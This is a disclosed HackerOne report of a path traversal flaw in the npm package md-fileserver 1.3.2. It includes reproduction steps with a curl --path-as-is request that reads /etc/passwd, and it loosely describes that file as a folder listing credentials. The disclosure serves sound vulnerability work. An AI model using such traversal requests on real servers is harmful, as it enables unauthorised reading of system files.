# [md-fileserver] Path Traversal

## Report Details
- **Report ID**: 509697
- **URL**: https://hackerone.com/reports/509697
- **State**: Closed
- **Severity**: high
- **Submitted**: 2019-03-14T15:06:55.721Z
- **Disclosed**: 2020-01-29T16:25:58.740Z

## Reporter
- **Username**: johnssimon007
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report path traversal in md-fileserver modulee
It allows an attacker to read system files via path traversal through commandline


# Module

**module name:** md-fileserver
**version:** 1.3.2
**npm page:** `https://www.npmjs.com/package/md-fileserver`

## Module Description
Starts a local server to render "markdown" files within your browser:

# Vulnerability

## Vulnerability Description
Directory traversal through the url which doesn't verify the file is from the root directory path.

## Steps To Reproduce:
1.npm install -g md-fileserver

2.start the local server by typing below on commandline
$mdstart

3.now on terminal type
curl -v --path-as-is http://127.0.0.1:8080/etc/passwd

it will list all the credentials in passwd folder

## Supporting Material/References:

> State all technical information about the stack where the vulnerability was found

- [OPERATING SYSTEM VERSION] kali linux
- [NODEJS VERSION] 11.8.0
- [NPM VERSION] 6.5.0

# Wrap up

> Select Y or N for the following statements:

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

This vulnerability allows malicious user to read content of any file on the server, which leads to data breach or other attacks.

## Attachments
- Screenshot_from_2019-03-14_20-39-50.png
